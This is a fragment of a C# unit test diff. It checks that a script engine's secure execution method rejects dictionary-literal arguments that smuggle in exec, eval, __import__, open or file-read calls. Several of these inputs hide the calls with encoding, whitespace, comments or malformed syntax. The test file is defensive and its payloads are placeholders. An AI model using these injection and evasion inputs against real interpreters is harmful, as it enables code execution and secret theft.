+                "{delattr(obj, 'attr'): \"delete\"}",
+                "{'normal_key': 'safe', exec('exploit'): 'dangerous'}",
+                "{1: 'safe', eval('malicious'): 'exploit'}",
+                "{'nested': {exec('deep'): 'very_dangerous'}}",
+                "{[exec('list_key')]: 'impossible_but_dangerous'}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary malicious key exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryNestedComplexExploits_BlocksDeepNesting()
+        {
+            var exploits = new[]
+            {
+                "{\"level1\": {\"level2\": {\"level3\": exec('deep_exploit')}}}",
+                "{\"outer\": {\"inner\": [exec('array_exploit'), {\"deeper\": __import__('os')}]}}",
+                "{\"complex\": {\"data\": [1, 2, {\"nested\": eval('nested_eval')}]}}",
+                "{\"mixed\": [{\"array_dict\": {\"deep\": open('file.txt')}}, \"safe_value\"]}",
+                "{\"super_nested\": {\"l1\": {\"l2\": {\"l3\": {\"l4\": {\"l5\": import sys}}}}}}",
+                "{\"alternating\": [{\"dict1\": [\"safe\", {\"dict2\": exec('alternating_exploit')}]}]}",
+                "{\"combination\": {\"safe\": \"ok\", \"arrays\": [{\"exploit\": __import__('subprocess')}]}}",
+                "{\"recursive\": {\"self\": {\"reference\": {\"deep\": globals()}}}}",
+                "{\"massive\": {\"a\": {\"b\": {\"c\": [{\"d\": {\"e\": eval('massive_exploit')}}]}}}}",
+                "{\"layers\": {\"1\": [{\"2\": {\"3\": [\"safe\", {\"4\": System.IO.File.ReadAllText('secrets')}]}}]}}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary deep nested exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryEncodingEvasion_BlocksEncodedExploits()
+        {
+            var exploits = new[]
+            {
+                "{\"\\x65\\x78\\x65\\x63\": \"encoded_exec\"}",
+                "{\"\\u0065\\u0078\\u0065\\u0063\": \"unicode_exec\"}",
+                "{\"eval\": \"\\x6f\\x70\\x65\\x6e('file.txt')\"}",
+                "{\"data\": \"\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\"}",
+                "{\"\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\": \"encoded_builtins\"}",
+                "{\"nested\": {\"\\x65\\x78\\x65\\x63\": \"nested_encoded\"}}",
+                "{\"array\": [\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\", \"safe\"]}",
+                "{\"mixed\": \"safe\", \"\\u0065\\u0076\\u0061\\u006c\": \"unicode_eval\"}",
+                "{1: \"\\x6f\\x70\\x65\\x6e\", 2: \"normal\"}",
+                "{\"complex\": {\"inner\": [\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\", {\"deep\": \"\\x6c\\x6f\\x63\\x61\\x6c\\x73\"}]}}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary encoding evasion exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryWhitespaceEvasion_BlocksWhitespaceVariations()
+        {
+            var exploits = new[]
+            {
+                "{\"key\": exec\t('code')}",
+                "{\"value\": eval\n('expression')}",
+                "{\"data\": __import__\r('os')}",
+                "{\"item\": open\u00A0('file.txt')}",
+                "{\"content\":   exec   ('spaced')}",
+                "{\t\"tab_key\"\t:\texec\t('tab_exploit')\t}",
+                "{\n\"newline_key\"\n:\neval\n('newline_exploit')\n}",
+                "{\"nested\": {\"inner\":\texec\t('nested_tab')}}",
+                "{\"array\": [exec\n('array1'), eval\t('array2')]}",
+                "{\"mixed\": \"safe\",\t\"bad\":\nexec\r('mixed_whitespace')}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary whitespace evasion exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryCommentEvasion_BlocksCommentTricks()
+        {
+            var exploits = new[]
+            {
+                "{\"key\": exec('code') # comment}",
+                "{\"value\": eval('expr') // comment}",
+                "{\"data\": __import__('os') # sneaky comment}",
+                "{\"item\": open('file') /* block comment */}",
+                "{\"content\": System.IO.File.ReadAllText('file') # hidden}",
+                "{\"nested\": {\"inner\": exec('nested') # deep comment}}",
+                "{\"array\": [eval('array') # comment, \"safe\"]}",
+                "{\"mixed\": \"safe\", \"bad\": import sys # inline comment}",
+                "{\"multi\": exec('line1') # comment\n# exec('line2')}",
+                "{\"tricky\": \"safe_value\" # exec('commented_out_but_dangerous')}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary comment evasion exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryMalformedSyntax_BlocksMalformedExploits()
+        {
+            var exploits = new[]
+            {
+                "{\"key\": value, exec('code')}",
+                "{\"incomplete\": \"string, exec('exploit')}",
+                "{\"unmatched\": [exec('array'), }",
+                "{\"broken\": {exec('nested'}",
+                "{\"invalid\": Player(1, exec('injection'))}",
+                "{\"syntax_error\": Card(exec('in_constructor'))}",
+                "{\"mixed_quotes\": 'single' + \"double\" + exec('mixed')}",
+                "{\"escaped\": \"value\\\", exec('escaped_quote')}",
+                "{\"partial\": {\"key\": exec('partial_dict'}",
+                "{\"array_break\": [\"safe\", exec('in_array']}",
+                "{\"function_break\": Player(1, Card(exec('nested_call')))}",
+                "{\"quote_confusion\": '\"exec('nested_quotes')\"'}",
+                "{\"backslash\": \"value\\\\\", exec('backslash_exploit')}",
+                "{\"unicode_break\": \"\\u0022 + exec('unicode_break') + \\u0022\"}",
+                "{\"concat\": \"safe\" + exec('concat_exploit') + \"more\"}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary malformed syntax exploit should be blocked: {exploit}");
+            }
+        }
+
+        [Test]
+        public void ExecuteFunctionSecureNoFormat_DictionaryAdvancedMixedExploits_BlocksComplexCombinations()
+        {
+            var exploits = new[]
+            {
+                "{\"combine\": [exec('array'), {\"nested\": __import__('os')}], \"safe\": \"value\"}",
+                "{\"layers\": {\"l1\": [\"safe\", {\"l2\": exec('deep')}, eval('shallow')]}}",
+                "{\"mixed_types\": {1: exec('numeric_key'), \"string_key\": eval('string_value')}}",
+                "{\"alternating\": [{\"dict_in_array\": exec('dict_exploit')}, eval('array_exploit')]}",
+                "{\"complex_nesting\": {\"outer\": [{\"inner\": {\"deepest\": [exec('very_deep')]}}]}}",
+                "{\"function_calls\": {\"player\": Player(exec('in_player')), \"card\": Card(eval('in_card'))}}",
+                "{\"string_injection\": {\"key\": \"value\"; exec('injected'), \"normal\": \"safe\"}}",
+                "{\"quote_mixing\": {'single': \"double\", 'exploit': exec('quote_mix')}}",
+                "{\"encoding_mix\": {\"\\x6b\\x65\\x79\": exec('encoded_key'), \"normal\": eval('normal_eval')}}",
+                "{\"spaced_exec\": {\"key\": \"value\"; exec('spaced_exec')}}",
+                "{\"tab_exploit\": {\"key\": \"value\"; exec\t('tab_exploit')}}",
+                "{\"newline_exploit\": {\"key\": \"value\"; eval\n('newline_exploit')}}",
+                "{\"nested_exploit\": {\"key\": \"value\"; exec('nested_exploit')}}",
+                "{\"mixed_exploit\": {\"safe\": \"ok\", \"danger\": exec('mixed_exploit')}}",
+                "{\"complex_exploit\": {\"a\": [{\"b\": {\"c\": exec('complex_exploit')}}]}}",
+                "{\"all_exploits\": {\"exec\": exec('print(1)'), \"eval\": eval('2+2')}}",
+                "{\"deeply_nested_exploit\": {\"level1\": {\"level2\": {\"level3\": exec('deep_exploit')}}}}",
+                "{\"function_overload\": {\"exec\": lambda x: x, \"print\": exec('print(1)')}}",
+                "{\"malicious_code\": {\"key\": \"value\"; exec('malicious_code')}}"
+            };
+
+            foreach (var exploit in exploits)
+            {
+                var ex = Assert.Throws<ScriptSecurityException>(() =>
+                    _engine.ExecuteFunctionSecureNoFormat("testFunction", exploit));
+                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
+                    $"Dictionary advanced mixed exploit should be blocked: {exploit}");
             }
         }
 
